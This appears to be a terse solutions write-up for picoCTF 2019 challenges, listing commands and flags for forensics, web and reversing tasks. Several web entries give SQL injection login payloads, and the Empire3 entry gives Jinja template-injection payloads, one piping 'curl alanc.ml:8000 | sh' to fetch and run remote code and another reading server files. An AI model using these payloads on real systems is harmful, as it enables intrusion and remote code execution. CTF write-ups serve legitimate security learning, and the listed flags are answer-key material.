# Glory of the Garden

```
$ strings garden.jpg | grep CTF
Here is a flag "picoCTF{more_than_m33ts_the_3y35Bbb98c7}"
```

flag: `picoCTF{more_than_m33ts_the_3y35Bbb98c7}`


# Insp3ct0r

```
$ curl https://2019shell1.picoctf.com/problem/52962/ | grep flag
        <!-- Html is neat. Anyways have 1/3 of the flag: picoCTF{tru3_d3 -->
$ curl https://2019shell1.picoctf.com/problem/52962/mycss.css | grep flag
/* You need CSS to make pretty pages. Here's part 2/3 of the flag: t3ct1ve_0r_ju5t */
$ curl https://2019shell1.picoctf.com/problem/52962/myjs.js | grep flag 
/* Javascript sure is neat. Anyways part 3/3 of the flag: _lucky?78ec625e} */
```

flag: `picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?78ec625e}`

# Lets Warm Up

```
$ python
>>> chr(0x70)
'p'
```

flag: `picoCTF{p}`

# The Numbers

```
$ python
>>> chr(ord('a')+16)
'q'
>>> chr(ord('a')-1+16)
'p'
>>> ''.join([chr(x+ord('a')-1) for x in [16,9,3,15,3,20,6,20,8,5,14,21,13,2,5,18,19,13,1,19,15,14]])
'picoctfthenumbersmason'
```

flag: `PICOCTF{THENUMBERSMASON}`


# Warmed Up

```
$ python
>>> 0x3D
61
```

flag: `picoCTF{61}`

# Java Script Kiddie

```javascript
var bytes = [];
$.get("bytes", function(resp) {
  bytes = Array.from(resp.split(" "), x => Number(x));
});

function assemble_png(u_in){
  var LEN = 16;
  var key = "0000000000000000";
  var shifter;
  if(u_in.length == LEN){
    key = u_in;
  }
  var result = [];
  for(var i = 0; i < LEN; i++){
    shifter = key.charCodeAt(i) - 48;
    for(var j = 0; j < (bytes.length / LEN); j ++){
      result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]
    }
  }
  while(result[result.length-1] == 0){
    result = result.slice(0,result.length-1);
  }
  document.getElementById("Area").src = "data:image/png;base64," + btoa(String.fromCharCode.apply(null, new Uint8Array(result)));
  return false;
}
```

```
$ http https://2019shell1.picoctf.com/problem/10188/bytes
...
93 252 96 40 231 79 55 23 0 238 31 21 252 223 19 79 121 99 78 226 238 47 225 93 0 15 0 63 73 159 254 31 98 125 1 15 21 191 67 39 1 0 0 190 0 233 78 68 180 66 0 130 142 221 0 39 84 0 0 1 73 69 0 0 248 80 133 71 43 221 26 178 104 0 0 62 0 0 68 82 130 0 51 114 123 80 1 140 249 0 156 0 219 72 95 108 174 0 208 2 255 0 68 195 213 120 32 0 145 192 138 227 137 20 82 225 248 10 12 23 126 239 192 13 204 81 48 75 0 178 254 107 0 0 128 0 17 177 73 0 143 119 236 164 164 205 79 221 13 73 170 10 219 131 67 237 240 131 65 92 56 186 72 100 0 140 149 114 59 139 72 75 56 112 195 135 26 31 127 191 139 181 214 65 170 160 43 230 58 225 192 188 50 27 185 140 255 227 193 245 245 182 240 236 251 119 144 12 89 210 251 178 41 167 209 1 219 158 238 248 120 0 207 208 15 65 250 85 140 182 169 192 15 164 132 210 216 121 63 199 63 81 242 92 126 252 246 63 155 241 152 248 230 194 203 135 172 249 242 225 188 251 251 161 192 27 75 7 72 151 246 247 92 123 31 185 39 12 221 62 227 255 73 236 163 14 6 32 183 100 19 123 109 68 249 63 63 100 151 63 130 146 118 60 158 15 165 63 160 245 25 245 147 42 65 1 33 127 179 247 111 197 87 254 62 242 70 242 165 44 179 190 110 31 36 195 215 221 43 91 79 198 241 192 123 202 79 210 45 79 63 44 225 251 211 173 4 104 149 226 233 109 11 203 126 123 240 63 251 173 111 115 135 188 186 109 95 195 122 255 236 254 165 115 44 239 101 122 100 137 173 18 47 1 246 45 164 175 79 208 115 217 31 158 87 201 191 64 210 53 157 223 79 5 123 98 105 204 227 214 227 214 124 132 183 51 98 246 153 55 163 252 244 254 37 79 137 188 240 253 95 91 174 155 130 248 140 207 58 234 219 214 221 209 183 91 111 66 109 182 139 86 40 215 21 46 178 105 182 30 63 96 85 254 138 23 252 180 128 190 254 60 50 11 221 9 25 175 152 207 233 183 159 108 254 54 175 3 249 48 216 115 190 104 24 51 76 43 43 177 222 247 65 64 184 70 211 132 247 212 197 219 247 213 126 95 9 127 162 223 149 244 71 153 85 8 165 48 58 39 102 226 49 158 62 71 55 91 241 124 114 214 138 229 254 24 237 57 252 89 11 89 100 12 86 181 238 68 167 31 111 235 166 160 62 34 144 180 159 174 188 242 162 151 174 168 209 203 175 190 235 87 240 107 220 115 86 174 46 239 96 208 254 96 226 223 239 231 129 129 199 95 93 239 118 122 46 237 114 39 90 233 127 176 215 159 161 116 63 171 182 185 251 67 251 188 109 9 75 204 123 94 218 239 127 21 239 187 252 109 103 191 181 149 62 55 39 240 58 248 238 219 223 173 215 75 190 243 52 124 86 43 191 149 76 158 189 213 248 31 230 252 242 155 156 114 29 86 175 2 189 73 135 39 138 210 135 255 255 191 166 124 44 99 158 175 126 39 93 95 11 147 0 88 211 102 119 159 250 173
```

# plumbing

```
$ nc 2019shell1.picoctf.com 57911 | grep ico
picoCTF{digital_plumb3r_bd6f0d49}
```

flag: `picoCTF{digital_plumb3r_bd6f0d49}`


# practice-run-1

```
$ strings run_this | grep pico
picoCTF{g3t_r3adY_2_r3v3r53}
```

flag: `picoCTF{g3t_r3adY_2_r3v3r53}`

# First Grep: Part II

```
$ grep -r "pico" .
./files4/file26:picoCTF{grep_r_to_find_this_fa996158}
```

flag: `picoCTF{grep_r_to_find_this_fa996158}`

# where-is-the-file

```
$ ls -al
total 76
drwxr-xr-x   2 root       root        4096 Sep 27 14:55 .
drwxr-x--x 689 root       root       65536 Sep 28 02:27 ..
-rw-rw-r--   1 hacksports hacksports    39 Sep 27 14:55 .cant_see_me
$ cat .cant_see_me
picoCTF{w3ll_that_d1dnt_w0RK_49685ac3}
```

flag: `picoCTF{w3ll_that_d1dnt_w0RK_49685ac3}`

# picobrowser

```
$ http https://2019shell1.picoctf.com/problem/49789/flag User-Agent:picobrowser 
```

flag: `picoCTF{p1c0_s3cr3t_ag3nt_65c3e4c1}`


# Client-side-again

```javascript
'use strict';
/** @type {!Array} */
var _0x5a46 = ["getElementById", "value", "substring", "picoCTF{", "not_this", "6e0bc}", "_again_0", "this", "Password Verified", "Incorrect password"]

var _0x4b5b = function(level, ai_test) {
  /** @type {number} */
  level = level - 0;
  var rowsOfColumns = _0x5a46[level];
  return rowsOfColumns;
};
/**
 * @return {undefined}
 */

function verify() {
  checkpass = document.getElementById("pass").value;
  /** @type {number} */
  if (checkpass.substring(0, 8) == "picoCTF{") {
    if (checkpass.substring(7, 9) == "{n") {
      if (checkpass.substring(8, 16) == 'not_this') {
        if (checkpass.substring(3, 6) == "oCT") {
          if (checkpass.substring(24, 32) == '6e0bc}') {
            if (checkpass["substring"](6, 11) == "F{not") {
              if (checkpass.substring(4 * 2 * 2, 4 * 3 * 2) == _0x4b5b("0x6")) {
                if (checkpass.substring(12, 16) == _0x4b5b("0x7")) {
                  alert("Password Verified");
                }
              }
            }
          }
        }
      }
    }
  } else {
    alert(_0x4b5b("0x9"));
  }
}
```

flag: `picoCTF{not_this_again_06e0bc}`

# logon

change cookie

flag: `picoCTF{th3_c0nsp1r4cy_l1v3s_8025092e}`

# waves over lambda

https://www.guballa.de/substitution-solver

flag: `picoCTF{frequency_is_c_over_lambda_dcltncsuia}`

# Irish-Name-Repo 1

username `admin`
password `' or 1=1--`

flag: `picoCTF{s0m3_SQL_6b96db35}`

# Irish-Name-Repo 2

inject username

username `admin'--`
password `admin`

flag: `picoCTF{m0R3_SQL_plz_c9c1c726}`

# Irish-Name-Repo 3

rot13

```
$ http -v -f POST https://2019shell1.picoctf.com/problem/45112/login.php debug=1 password="' || cnffjbeq yvxr '%'--"POST /problem/45112/login.php HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Length: 53
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Host: 2019shell1.picoctf.com
User-Agent: HTTPie/0.9.8

debug=1&password=%27+%7C%7C+cnffjbeq+yvxr+%27%25%27--

HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: gzip
Content-Type: text/html; charset=UTF-8
Date: Sun, 29 Sep 2019 05:35:14 GMT
Server: nginx
Strict-Transport-Security: max-age=0
Transfer-Encoding: chunked

<pre>password: ' || cnffjbeq yvxr '%'--
SQL query: SELECT * FROM admin where password = '' || password like '%'--'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_9a2f17b3}</p>
```

flag: `picoCTF{3v3n_m0r3_SQL_9a2f17b3}`

# pastaAAA

stegsolve.jar

flag: `picoCTF{pa$ta_1s_lyf3}`

# Empire1

flag: `picoCTF{wh00t_it_a_sql_injectb819aa6f}`

# Empire2

```
{{session}}
```

flag: `'picoCTF{its_a_me_your_flag786f93f7}`

# Empire3

{{config['PRESERVE_CONTEXT_ON_EXCEPTION'].__class__.__mro__[1].__subclasses__()[287](['sh', '-c', 'curl alanc.ml:8000 | sh'])}}

{{config['PRESERVE_CONTEXT_ON_EXCEPTION'].__class__.__mro__[1].__subclasses__()[459](request.args.param1).open().read()}}

view-source:https://2019shell1.picoctf.com/problem/32252/list_items?param1=/proc/self/cwd/app/__init__.py

['sh', '-c', 'curl alanc.ml:8000 | sh']

picoCTF{cookies_are_a_sometimes_food_ca3aaf8b}


# 

windbg

```
gu
gu
gu
...
set eip
```

flag: `PICOCTF{These are the access codes to the vault: 1063340}`



```php
<?php
$sql_server = 'localhost';
$sql_user = 'mysql';
$sql_pass = 'this1sAR@nd0mP@s5w0rD#%';
$sql_conn = new mysqli($sql_server, $sql_user, $sql_pass);

echo "hello";

if($sql_conn->connect_errno){
        die('Could not connect');
}
$q = 'SELECT * FROM pico_ch2.users';

$result = $sql_conn->query($q);


echo "The flag is: ";


while ($row = mysqli_fetch_array($result)) {
        echo $row['password'];
}
$sql_conn->close();
?>
```